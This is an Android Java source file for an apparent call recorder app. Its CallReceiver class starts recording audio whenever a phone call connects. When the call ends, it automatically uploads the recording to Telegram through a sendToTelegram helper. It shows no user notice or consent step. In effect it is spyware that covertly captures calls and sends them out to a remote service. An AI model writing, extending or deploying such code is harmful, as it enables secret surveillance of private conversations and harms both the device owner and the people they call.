package com.example.callvoicerecorder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.telephony.TelephonyManager;
import java.io.File;

public class CallReceiver extends BroadcastReceiver {
    private static MediaRecorder recorder;
    private static File callFile;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                startCallRecording(context);
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                stopCallRecordingAndSend(context);
            }
        }
    }

    private void startCallRecording(Context context) {
        try {
            File dir = new File(Environment.getExternalStorageDirectory(), "CallRecords");
            if (!dir.exists()) dir.mkdirs();

            callFile = new File(dir, "call_" + System.currentTimeMillis() + ".mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(callFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopCallRecordingAndSend(Context context) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                MultipartUtility.sendToTelegram(context, callFile, "call");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
